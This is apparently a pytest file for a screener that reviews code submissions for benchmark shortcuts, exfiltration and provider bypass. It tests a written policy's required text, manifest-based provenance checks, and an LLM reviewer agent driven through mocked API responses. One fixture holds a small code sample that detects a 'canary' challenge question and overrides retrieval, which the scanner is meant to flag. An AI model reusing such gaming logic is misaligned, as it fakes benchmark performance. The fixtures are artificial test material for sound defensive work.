        "exact\nmatched bytes at the recorded path",
        "This equivalence is field- and role-scoped.",
        "verification-profile digest all match",
        "artifact-bound screening and challenge records",
        "V1.required_submission_evidence_missing",
        "V2.platform_verification_failed",
    }

    assert not sorted(
        fragment for fragment in policy_required if fragment not in policy
    )
    assert not sorted(
        fragment for fragment in opaque_required if fragment not in opaque
    )


def test_written_policy_v13_is_strictly_two_outcome() -> None:
    """v13 resolves every completed review to CLEAR or REJECT.

    A verification failure is a rejection with ``violation_proven: false`` and
    a named failure domain, never an indefinite hold and never an allegation
    of cheating.
    """

    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()
    required = {
        "Policy v13 has exactly two final outcomes",
        "There is no `REVIEW_INCOMPLETE`, `INCONCLUSIVE`, implied clearance",
        "violation_proven: true | false",
        "failure_domain: artifact | submission | platform | provider | none",
        "must never be described as cheating",
        "A. Proven integrity or security violation",
        "B. Submission-controlled verification failure",
        "C. Platform verification failure",
        "D. Provider verification failure",
        "V1.required_submission_evidence_missing",
        "V2.platform_verification_failed",
        "V3.provider_verification_failed",
        "Q1.protocol_contract_failure",
        "## Operator override",
        "It does not convert `REJECT` to `CLEAR`.",
        "maximum verification window: 24 hours",
    }

    missing = sorted(fragment for fragment in required if fragment not in policy)
    assert not missing, f"policy v13 is missing: {missing}"


def test_written_policy_v13_publishes_a_ground_for_every_v13_category() -> None:
    """A category the reviewer can emit must have a published ground.

    Policy v13 requires every rejection ground to be published before it is
    enforced. A review category that exists only in the screener would let a
    finding land with no policy behind it, so each v13-only category is named
    in the policy text.
    """

    from ditto_screener.source_review import _POLICY_V13_ONLY_CATEGORIES

    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()

    unpublished = sorted(
        category for category in _POLICY_V13_ONLY_CATEGORIES if category not in policy
    )

    assert not unpublished, (
        f"screener can emit v13 categories with no published ground: {unpublished}"
    )


def test_written_policy_v13_forbids_every_non_decisive_admission() -> None:
    """No non-decisive screener code may read as a clearance under v13.

    Every code the engine can emit without reaching a decision has to be named
    in the policy as something that cannot CLEAR.
    """

    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()
    non_decisive = {
        "source-review-inconclusive",
        "source-review-invalid-risk",
        "source-review-inconsistent-verdict",
        "source-review-adjudication-refused",
        "behavioral-oracle-inconclusive",
        "challenge-inconclusive",
        "source-review-unavailable",
    }

    unpublished = sorted(code for code in non_decisive if code not in policy)
    assert not unpublished, f"policy v13 does not resolve: {unpublished}"

    assert "may produce `CLEAR`, and none of them may submit a passing" in policy
    assert "v13 protocol guard that rejects\n  `pass_inconclusive`" in policy
    assert "deadline finalizer" in policy


def test_written_policy_v13_covers_the_prompt_security_surface() -> None:
    """The v13 prompt and the published grounds must not drift apart.

    The prompt tells the reviewer which security surface to cover. Anything it
    names has to be a published S-condition, otherwise the screener reviews
    for something it cannot reject on.
    """

    from ditto_screener.source_review import _POLICY_V13_ADDENDUM

    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()
    assert "host-resource access" in _POLICY_V13_ADDENDUM
    assert "additional rejection\ngrounds" in _POLICY_V13_ADDENDUM
    required = {
        "### S2: credential or data exfiltration",
        "host-resource access",
        "hidden runtime replacement",
        "S2.credential_or_data_exfiltration",
    }

    missing = sorted(fragment for fragment in required if fragment not in policy)
    assert not missing, f"policy v13 is missing: {missing}"
    assert "S2.unauthorized_execution" not in policy
    assert "S2.resource_isolation_violation" not in policy


def test_written_policy_v13_publishes_the_metamorphic_minimum_profile() -> None:
    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()
    required = {
        "private\nmetamorphic testing is mandatory",
        "60 paired cases",
        "three transformation classes",
        "at least 20 cases per class",
        "two independent hidden seeds",
        "material degradation of at least 15 percentage points",
        "95% confidence lower bound above 5 percentage points",
        "clean-control degradation no greater than 5 percentage points",
        "replication in the same direction across both seeds",
    }

    missing = sorted(fragment for fragment in required if fragment not in policy)
    assert not missing, f"policy v13 is missing: {missing}"


def test_latest_backroom_safe_batch_is_fully_represented() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )

    assert fixture["latest_backroom_safe_batch"] == {
        "false_positive_classes": 5,
        "false_positive_submissions": 7,
        "correct_rejections": 6,
        "infrastructure_rescreens": 1,
    }
    assert fixture["recent_review_gaps"] == {
        "false_negative_families": 4,
        "advisory_classes": 2,
    }
    assert fixture["operator_batch_2026_07_23"] == {
        "legitimate_observed_preflight_handlers": 4,
        "inert_local_launcher_submissions": 2,
        "benchmark_emulation_rejections": 3,
    }


def test_exact_official_provenance_does_not_whitelist_derivatives(
    tmp_path: Path,
) -> None:
    official = b"official public fixture"
    modified = b"official public fixture plus hidden derivative"
    manifest = tmp_path / "provenance.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "abc123",
                "files": {
                    "fixtures/models/official.bin": hashlib.sha256(
                        official
                    ).hexdigest(),
                    "fixtures/seed-user/official.json": hashlib.sha256(
                        official
                    ).hexdigest(),
                },
            }
        )
    )
    archive = _archive_files(
        tmp_path,
        {
            "fixtures/models/official.bin": official,
            "fixtures/seed-user/official.json": modified,
            "fixtures/models/derivative.bin": official,
        },
    )

    provenance = json.loads(
        TarSourceRepository(str(archive)).trusted_provenance(str(manifest))
    )

    assert provenance["matched_exact_files"] == ["fixtures/models/official.bin"]
    assert provenance["tracked_but_modified_files"] == [
        "fixtures/seed-user/official.json"
    ]
    assert "fixtures/models/derivative.bin" not in json.dumps(provenance)


def test_closest_official_provenance_uses_exact_supported_revision(
    tmp_path: Path,
) -> None:
    older = tmp_path / "older.json"
    current = tmp_path / "current.json"
    files = {"src/main.rs": b"current", "README.md": b"shared"}
    for path, revision, main_digest in (
        (older, "older", hashlib.sha256(b"older").hexdigest()),
        (current, "current", hashlib.sha256(b"current").hexdigest()),
    ):
        path.write_text(
            json.dumps(
                {
                    "version": 1,
                    "origin": "public/starter",
                    "revision": revision,
                    "files": {
                        "src/main.rs": main_digest,
                        "README.md": hashlib.sha256(b"shared").hexdigest(),
                    },
                }
            )
        )
    archive = _archive_files(tmp_path, files)

    provenance = json.loads(
        TarSourceRepository(str(archive)).closest_trusted_provenance(
            (str(older), str(current))
        )
    )

    assert provenance["revision"] == "current"
    assert provenance["matched_exact_files"] == ["README.md", "src/main.rs"]
    assert provenance["tracked_but_modified_files"] == []
    assert provenance["supported_revisions"] == ["current", "older"]
    assert provenance["candidate_revisions"] == ["current"]
    assert provenance["selection"] == "unique-closest-supported-revision"
    assert provenance["scope"] == "exact-path-and-sha256-only"


def test_closest_official_provenance_reports_ambiguous_exact_tie(
    tmp_path: Path,
) -> None:
    shared = b"shared"
    manifests: list[str] = []
    for revision in ("older", "newer"):
        manifest = tmp_path / f"{revision}.json"
        manifest.write_text(
            json.dumps(
                {
                    "version": 1,
                    "origin": "public/starter",
                    "revision": revision,
                    "files": {"README.md": hashlib.sha256(shared).hexdigest()},
                }
            )
        )
        manifests.append(str(manifest))
    archive = _archive_files(tmp_path, {"README.md": shared})

    provenance = json.loads(
        TarSourceRepository(str(archive)).closest_trusted_provenance(tuple(manifests))
    )

    assert provenance["revision"] is None
    assert provenance["candidate_revisions"] == ["newer", "older"]
    assert provenance["selection"] == "ambiguous-closest-supported-revisions"
    assert provenance["matched_exact_files"] == ["README.md"]


def test_provenance_hashes_the_archive_once_across_manifests(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    files = {
        "./Dockerfile": b"FROM scratch\n",
        "src/main.rs": b"fn main() {}\n",
        "fixtures/model.bin": bytes(range(256)) * 8192,
    }
    archive = _archive_files(tmp_path, files)
    digests = {
        name.removeprefix("./"): hashlib.sha256(raw).hexdigest()
        for name, raw in files.items()
    }
    manifests: list[str] = []
    for revision in ("v1", "v2", "v3"):
        manifest = tmp_path / f"{revision}.json"
        manifest.write_text(
            json.dumps(
                {
                    "version": 1,
                    "origin": "public/starter",
                    "revision": revision,
                    "files": {
                        **digests,
                        "src/main.rs": digests["src/main.rs"]
                        if revision == "v2"
                        else hashlib.sha256(revision.encode()).hexdigest(),
                    },
                }
            )
        )
        manifests.append(str(manifest))
    repository = TarSourceRepository(str(archive))
    opened = 0
    real_open = source_review_module.tarfile.open

    def counting_open(*args: Any, **kwargs: Any) -> tarfile.TarFile:
        nonlocal opened
        opened += 1
        return real_open(*args, **kwargs)

    monkeypatch.setattr(source_review_module.tarfile, "open", counting_open)

    provenance = json.loads(repository.closest_trusted_provenance(tuple(manifests)))

    assert opened == 1
    assert provenance["revision"] == "v2"
    assert provenance["matched_exact_files"] == sorted(digests)
    assert all(repository.member_sha256(name) == digests[name] for name in digests)
    assert opened == 1
    with pytest.raises(ValueError, match="unknown archive member"):
        repository.member_sha256("missing.rs")


@pytest.mark.parametrize("replace_file", [False, True])
def test_repository_refuses_changed_archive_after_digest_cache(
    tmp_path: Path, replace_file: bool
) -> None:
    archive = _archive_files(tmp_path, {"src/main.rs": b"fn main() {}\n"})
    repository = TarSourceRepository(str(archive))
    repository.member_sha256("src/main.rs")
    if replace_file:
        archive.unlink()
    _archive_files(tmp_path, {"src/main.rs": b"fn main() { dangerous(); }\n"})
    with pytest.raises(ValueError, match="source archive changed"):
        repository.member_sha256("src/main.rs")
    with pytest.raises(ValueError, match="source archive changed"):
        repository._read_text("src/main.rs")


def test_historical_environment_template_never_grants_lead_skip(tmp_path: Path) -> None:
    manifest = tmp_path / "historical.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "old",
                "files": {".env.example": "a" * 64, "src/main.rs": "b" * 64},
            }
        )
    )
    assert source_review_module._trusted_starter_digests((str(manifest),)) == {
        "src/main.rs": frozenset({"b" * 64})
    }


def _current_starter_kit_files() -> dict[str, bytes]:
    if not _STARTER_KIT.is_dir():
        pytest.skip("the monorepo starter kit is not part of this checkout")
    return {
        relative: (_STARTER_KIT / relative).read_bytes()
        for relative in starter_files(_STARTER_KIT)
    }


def _current_starter_kit_sources() -> dict[str, bytes]:
    """The kit's UTF-8 text files, without the binary model blobs.

    Trust selection and the lead scan treat the blobs like any other file,
    but a gzip archive re-decompresses on every backward seek, so leaving
    the multi-megabyte models out keeps whole-kit tests fast.
    """
    sources = {}
    for path, raw in _current_starter_kit_files().items():
        try:
            raw.decode("utf-8")
        except UnicodeDecodeError:
            continue
        sources[path] = raw
    return sources


def _staged_starter_manifests() -> tuple[str, ...]:
    staged = tuple(str(path) for path in manifests_in(STAGED_MANIFESTS))
    if not staged:
        pytest.skip("no starter provenance manifest is staged")
    return staged


def _exact_starter_matches(
    files: dict[str, bytes], manifests: tuple[str, ...]
) -> set[str]:
    """Paths whose exact bytes some manifest pins, computed independently."""
    pinned: dict[str, set[str]] = {}
    for manifest in manifests:
        for path, digest in json.loads(Path(manifest).read_text())["files"].items():
            pinned.setdefault(path, set()).add(digest)
    return {
        path
        for path, raw in files.items()
        if hashlib.sha256(raw).hexdigest() in pinned.get(path, set())
    }


def test_runtime_provenance_ignores_staged_starter_manifests(
    tmp_path: Path,
) -> None:
    files = _current_starter_kit_sources()
    staged = _staged_starter_manifests()
    repository = TarSourceRepository(str(_archive_files(tmp_path, files)))
    staged_only = _exact_starter_matches(files, staged) - _exact_starter_matches(
        files, _STARTER_MANIFESTS
    )
    assert staged_only

    runtime = json.loads(repository.closest_trusted_provenance(_STARTER_MANIFESTS))

    # L1's exact-file provenance reads the runtime set only, so a file that
    # only a staged manifest pins stays attributed to the miner until the
    # staged manifest is activated.
    assert runtime["revision"] not in {
        json.loads(Path(path).read_text())["revision"] for path in staged
    }
    assert not staged_only & set(runtime["matched_exact_files"])

    # The newest manifest, named explicitly, matches every kit file exactly:
    # the evidence an activation review starts from.
    newest = newest_manifest(RUNTIME_MANIFESTS, STAGED_MANIFESTS)
    exact = json.loads(repository.closest_trusted_provenance((str(newest),)))
    assert exact["revision"] == json.loads(newest.read_text())["revision"]
    assert exact["selection"] == "unique-closest-supported-revision"
    assert exact["matched_exact_files"] == sorted(files)
    assert exact["tracked_but_modified_files"] == []


def _untrusting_manifest(tmp_path: Path) -> str:
    """A valid manifest that trusts nothing, disabling the starter digest skip."""
    manifest = tmp_path / "untrusting.json"
    manifest.write_text(
        json.dumps({"version": 1, "origin": "test", "revision": "none", "files": {}})
    )
    return str(manifest)


def _kit_manifest(tmp_path: Path, files: dict[str, bytes]) -> str:
    """A manifest pinning exactly ``files``, so a test never depends on which
    manifests the runtime set holds."""
    manifest = tmp_path / "kit-manifest.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "test",
                "revision": "kit",
                "files": {
                    path: hashlib.sha256(raw).hexdigest() for path, raw in files.items()
                },
            }
        )
    )
    return str(manifest)


def test_review_leads_skip_exact_starter_files(tmp_path: Path) -> None:
    files = _current_starter_kit_sources()
    archive = str(_archive_files(tmp_path, files))

    leads = TarSourceRepository(archive).review_leads((_kit_manifest(tmp_path, files),))
    untrusted = TarSourceRepository(archive).review_leads(
        (_untrusting_manifest(tmp_path),)
    )

    assert leads["items"] == []
    assert leads["emulation_fingerprints"] == []
    assert leads["trusted_starter_skipped"] == untrusted["files_scanned"] > 0
    assert untrusted["trusted_starter_skipped"] == 0
    assert untrusted["items"]
    # Whole-program analyses still see every readable file.
    for key in (
        "unmatchable_category_guards",
        "generator_mirroring",
        "review_adaptive_model_routing",
        "files_scanned",
        "bytes_scanned",
        "truncated",
    ):
        assert leads[key] == untrusted[key], key


def test_review_leads_trust_only_runtime_manifests(tmp_path: Path) -> None:
    files = _current_starter_kit_sources()
    staged = _staged_starter_manifests()
    runtime_exact = _exact_starter_matches(files, _STARTER_MANIFESTS)
    staged_only = _exact_starter_matches(files, staged) - runtime_exact
    assert staged_only

    # The default trust set, which both L1 and L2 inventories use, is the
    # runtime manifests. A kit file that only a staged manifest pins keeps
    # its leads until that manifest is activated.
    leads = TarSourceRepository(str(_archive_files(tmp_path, files))).review_leads()

    assert leads["trusted_starter_skipped"] == len(runtime_exact)
    assert leads["files_scanned"] - leads["trusted_starter_skipped"] >= len(staged_only)


def test_review_leads_keep_every_lead_of_a_modified_starter_fixture(
    tmp_path: Path,
) -> None:
    files = _current_starter_kit_sources()
    fixture = "fixtures/seed-user/pairs.json"
    edited = files[fixture] + b"\n"
    expected = find_source_review_leads([(fixture, edited.decode())])
    assert expected

    # One trailing byte breaks the exact digest match; the fixture keeps all
    # of its leads while every other file is still a trusted starter file.
    leads = TarSourceRepository(
        str(_archive_files(tmp_path, {**files, fixture: edited}))
    ).review_leads((_kit_manifest(tmp_path, files),))

    assert leads["trusted_starter_skipped"] == leads["files_scanned"] - 1
    assert leads["items"] == expected


def test_review_leads_fingerprint_a_test_named_module_loaded_at_run_time(
    tmp_path: Path,
) -> None:
    from tests.test_emulation_fingerprints import RUNTIME_LOADED_TEST_MODULE

    # Maintainer counterexample on #2567: app.py serves scripts/ through a
    # base64-encoded runpy path, so the inventory keeps its fingerprint.
    leads = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {path: text.encode() for path, text in RUNTIME_LOADED_TEST_MODULE},
            )
        )
    ).review_leads((_untrusting_manifest(tmp_path),))

    assert "scripts/test_rehearsal.py" in {
        str(location["path"])
        for finding in leads["emulation_fingerprints"]
        if finding["kind"] == "sync-answer-constructor"
        for location in finding["locations"]
    }


@pytest.mark.parametrize("path", ["server/answer.py", "scripts/test_answer.py"])
def test_review_leads_not_starved_by_non_source_noise(
    tmp_path: Path, path: str
) -> None:
    # The kit's scripts/ are executable source and compete for the cap on
    # equal terms; the noise here is docs, fixtures, HTML and build files.
    files = {
        name: raw
        for name, raw in _current_starter_kit_sources().items()
        if not name.startswith("scripts/")
    }
    miner = (
        b"def route(question, memories):\n"
        b'    if contains(question, "canary"):\n'
        b"        memories.inject(question)\n"
        b"    return memories\n"
    )
    archive = _archive_files(tmp_path, {**files, path: miner})

    # With no starter trust, docs, fixtures, HTML and lockfiles alone would
    # fill the lead cap before an executable file sorted after them. A
    # test-named module is executable source too: nothing proves it unserved.
    leads = TarSourceRepository(str(archive)).review_leads(
        (_untrusting_manifest(tmp_path),)
    )

    assert {
        "kind": "challenge-shaped-retrieval-override",
        "locations": [
            {"path": path, "line": 2, "role": "challenge-shape"},
            {"path": path, "line": 2, "role": "input-recognition"},
            {"path": path, "line": 3, "role": "retrieval-override"},
        ],
    } in leads["items"]


@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
def test_malicious_preflight_ignores_staged_starter_manifests(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, mode: str
) -> None:
    files = _current_starter_kit_sources()
    staged = _staged_starter_manifests()
    scanned: list[list[str]] = []

    def recording_detector(
        readable: list[tuple[str, str]], **kwargs: object
    ) -> list[dict[str, object]]:
        scanned.append([path for path, _text in readable])
        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(
        source_review_module, "find_decisive_malicious_source", recording_detector
    )
    kit = TarSourceRepository(
        str(_archive_files(tmp_path, files)), static_preflight_v2_mode=mode
    )
    runtime_paths = kit._explicit_runtime_paths()
    runtime_trusted = _exact_starter_matches(files, _STARTER_MANIFESTS)

    assert kit.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None

    # The default trust set is the runtime manifests only: every runtime file
    # that only a staged manifest pins is still scanned as miner-authored.
    assert set(scanned[-1]) == runtime_paths - runtime_trusted
    assert runtime_paths & (_exact_starter_matches(files, staged) - runtime_trusted)

    # Naming the staged manifests shows the exact trust that activation would
    # grant: no kit file is scanned, and one changed byte is.
    with_staged = (*_STARTER_MANIFESTS, *staged)
    assert (
        kit.malicious_preflight(
            artifact_sha256="a" * 64, mode=mode, provenance_manifest_paths=with_staged
        )
        is None
    )
    assert scanned[-1] == []
    edited_path = next(
        (path for path in sorted(runtime_paths) if path.endswith(".rs")), None
    )
    if edited_path is None:
        pytest.skip("the starter kit has no Rust runtime source to modify")
    modified_dir = tmp_path / "modified"
    modified_dir.mkdir()
    modified = TarSourceRepository(
        str(
            _archive_files(
                modified_dir, {**files, edited_path: files[edited_path] + b"\n"}
            )
        ),
        static_preflight_v2_mode=mode,
    )
    modified.malicious_preflight(
        artifact_sha256="b" * 64, mode=mode, provenance_manifest_paths=with_staged
    )
    assert scanned[-1] == [edited_path]


async def test_sanitized_shortcut_fixture_produces_bounded_risk_digest(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "high",
        "confidence": 0.98,
        "categories": ["benchmark_emulation", "provider_bypass"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "provider_bypass"},
        ],
        "summary": "Deterministic shortcut bypasses the general provider path.",
    }
    source = "fn serve() { run(); }\nfn run() { fast_path(); }"
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation", "provider_bypass")
    assert observation.finding_digest is not None
    assert len(observation.finding_digest) == 64

    # The bounded finding rides along for the operator console and hashes to
    # the digest that the signed verdict binds.
    assert observation.finding is not None
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert parsed.canonical_digest() == observation.finding_digest
    assert parsed.risk_level == "high"
    assert parsed.summary == final["summary"]
    assert [item.model_dump() for item in parsed.evidence] == final["evidence"]
    # Nothing beyond the sanitized, bounded fields is retained.
    assert set(observation.finding) == {
        "artifact_sha256",
        "prompt_revision",
        "risk_level",
        "confidence",
        "categories",
        "evidence",
        "invariant_assessment",
        "summary",
    }


async def test_no_tool_turn_is_corrected_inside_the_same_review(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    requests: list[dict[str, object]] = []
    final = {
        "risk_level": "high",
        "confidence": 0.98,
        "categories": ["benchmark_emulation"],
        "evidence": [
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic shortcut bypasses the general provider path.",
    }

    def handler(request: httpx.Request) -> httpx.Response:
        requests.append(json.loads(request.content))
        if len(requests) == 1:
            tool_calls: list[dict[str, object]] = []
        elif len(requests) == 2:
            tool_calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 400},
                ),
                _tool("search-1", "search", {"query": "fast_path"}),
            ]
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    source = "fn serve() { run(); }\nfn run() { fast_path(); }"
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, source)), artifact_sha256=_SHA
    )

    assert observation.ok
    assert len(requests) == 3
    correction = requests[1]["messages"][-1]  # type: ignore[index]
    assert correction["role"] == "user"
    assert "did not call a declared tool" in correction["content"]


async def test_malformed_or_unavailable_reviewer_is_retryable_not_reject(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("short")
    os.chmod(key, 0o600)
    observation = await _agent(
        key, httpx.MockTransport(lambda _: httpx.Response(500))
    ).review(str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA)

    assert not observation.ok
    assert observation.risk_level is None
    assert observation.error_code == "source-review-oserror"


@pytest.mark.parametrize(
    ("final", "expected_error_code"),
    [
        (
            {
                "risk_level": "low",
                "confidence": 0.9,
                "categories": ["benchmark_emulation"],
                "evidence": [
                    {
                        "path": "src/main.rs",
                        "line": 1,
                        "category": "benchmark_emulation",
                    }
                ],
                "summary": "Low risk despite a prohibited category.",
            },
            "source-review-inconsistent-verdict-low-risk-category",
        ),
        (
            {
                "risk_level": "high",
                "confidence": 0.9,
                "categories": ["benchmark_emulation"],
                "evidence": [
                    {
                        "path": "src/main.rs",
                        "line": 1,
                        "category": "benchmark_emulation",
                    }
                ],
                "summary": "High risk without a separate causal source location.",
            },
            "source-review-inconsistent-verdict-category-locations",
        ),
        (
            {
                "risk_level": "high",
                "confidence": 0.9,
                "categories": ["benchmark_emulation", "none"],
                "evidence": [
                    {
                        "path": "src/main.rs",
                        "line": 1,
                        "category": "benchmark_emulation",
                    },
                    {
                        "path": "src/main.rs",
                        "line": 2,
                        "category": "benchmark_emulation",
                    },
                ],
                "summary": "None cannot hide an elevated category.",
            },
            "source-review-inconsistent-verdict-none-mixed",
        ),
    ],
)
async def test_internally_inconsistent_review_is_retryable_not_a_weak_finding(
    tmp_path: Path, final: dict[str, object], expected_error_code: str
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, "fn serve() { route(); }\nfn route() {}")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == expected_error_code


async def test_expired_lease_deadline_stops_review_before_first_call(
    tmp_path: Path,
) -> None:
    import asyncio

    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(200, json={"choices": []})

    loop = asyncio.get_running_loop()
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
        deadline=loop.time() - 1.0,
    )
    # An exhausted lease aborts the review before any model turn and surfaces a
    # retryable (ok=False) observation rather than burning the per-request
    # timeout on every step.
    assert calls == 0
    assert not observation.ok
    assert observation.error_code == "source-review-lease-budget-exhausted"
    assert observation.review_audit is not None
    assert observation.review_audit["stage"] == "l1"
    assert observation.review_audit["reason_code"] == (
        "source-review-lease-budget-exhausted"
    )
    assert observation.review_audit["steps_used"] == 0


async def test_deadline_expiry_mid_turn_is_lease_budget(tmp_path: Path) -> None:
    """The lease normally ends inside a model turn, not at a turn boundary."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    async def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls > 1:
            await asyncio.Event().wait()
        tool_calls = [
            _note_call("n1", "cleared", "Entrypoint routes to a genuine model call."),
            _note_call("n2", "cleared", "Tool dispatch executes model-authored calls."),
            _note_call("n3", "cleared", "Answer construction forwards model text."),
        ]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=5,
        max_steps=4,
        transport=httpx.MockTransport(handler),
        transport_retry_delays=(),
    )
    observation = await agent.review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
        deadline=asyncio.get_running_loop().time() + 0.3,
    )

    assert calls == 2
    assert not observation.ok
    assert observation.error_code == "source-review-lease-budget-exhausted"
    # The ledger decides, exactly as for a step or read budget.
    assert observation.failure_disposition == "pass_inconclusive"
    assert len(observation.notes) == 3
    assert observation.review_audit is not None
    assert observation.review_audit["stage"] == "l1"
    assert observation.review_audit["reason_code"] == (
        "source-review-lease-budget-exhausted"
    )
    assert 1 <= observation.review_audit["steps_used"] <= 4


async def test_provider_timeout_with_open_lease_stays_retryable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    async def handler(_request: httpx.Request) -> httpx.Response:
        await asyncio.Event().wait()
        raise AssertionError("unreachable")

    monkeypatch.setattr(source_review_module, "_MAX_COMPLETION_REQUEST_SECONDS", 0.05)
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
        # The request cap fires with <1 s left on the lease. It remains a
        # provider timeout because the lease did not bound this model turn.
        deadline=asyncio.get_running_loop().time() + 0.5,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-model-timeout"
    assert observation.failure_disposition == "retryable_infra"
    assert observation.review_audit is None


async def test_transient_openrouter_failure_recovers_in_same_turn(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            return httpx.Response(503, request=request)
        return httpx.Response(
            200,
            request=request,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [
                                _tool(
                                    "submit-1",
                                    "submit_review",
                                    {
                                        "risk_level": "low",
                                        "confidence": 0.9,
                                        "categories": ["none"],
                                        "evidence": [],
                                        "summary": "General model-backed path.",
                                    },
                                )
                            ],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert calls == 2


async def test_hallucinated_citations_are_dropped_before_digest_binding(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "high",
        "confidence": 0.9,
        "categories": ["benchmark_emulation"],
        "evidence": [
            # Real file, real line: kept.
            {"path": "src/main.rs", "line": 1, "category": "benchmark_emulation"},
            {"path": "src/main.rs", "line": 2, "category": "benchmark_emulation"},
            # Nonexistent file: dropped.
            {"path": "src/ghost.rs", "line": 3, "category": "benchmark_emulation"},
            # Real file, impossible line: dropped.
            {"path": "src/main.rs", "line": 9999, "category": "benchmark_emulation"},
        ],
        "summary": "Deterministic shortcut bypasses the general provider path.",
    }
    observation = await _agent(key, _transport(final, [])).review(
        str(_archive(tmp_path, "fn run() { fast_path(); }\nfn fast_path() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.finding is not None
    parsed = SourceReviewFinding.model_validate(observation.finding)
    assert [(item.path, item.line) for item in parsed.evidence] == [
        ("src/main.rs", 1),
        ("src/main.rs", 2),
    ]
    # The digest binds the VALIDATED evidence set.
    assert parsed.canonical_digest() == observation.finding_digest


def test_inventory_degrades_partially_with_truncation_metadata(
    tmp_path: Path,
) -> None:
    # Many files with long names would previously collapse the whole
    # inventory into a truncation error; now the listing shrinks but the
    # counts and flags survive.
    files = {
        f"src/module_{index:04d}/{'x' * 120}.rs": b"fn f() {}\n" for index in range(700)
    }
    files["assets/table.bin"] = b"\xff\xfe\x00binary" * 4
    repo = TarSourceRepository(str(_archive_files(tmp_path, files)))
    inventory = json.loads(repo.inventory())

    assert "error" not in inventory
    assert inventory["file_count"] == len(files)
    assert inventory["truncated"] is True
    assert inventory["files_listed"] == len(inventory["largest_files"])
    assert inventory["opaque_total"] == 1
    assert inventory["opaque_blobs"][0]["path"] == "assets/table.bin"
    encoded = json.dumps(inventory, sort_keys=True, separators=(",", ":"))
    assert len(encoded) <= 48_000


# ---------------------------------------------------------------------------
# v7 proactive overfit leads (locations/roles only) + FP guards
# ---------------------------------------------------------------------------


def _sample(data: bytes) -> BinarySample:
    return BinarySample(
        data=data,
        size=len(data),
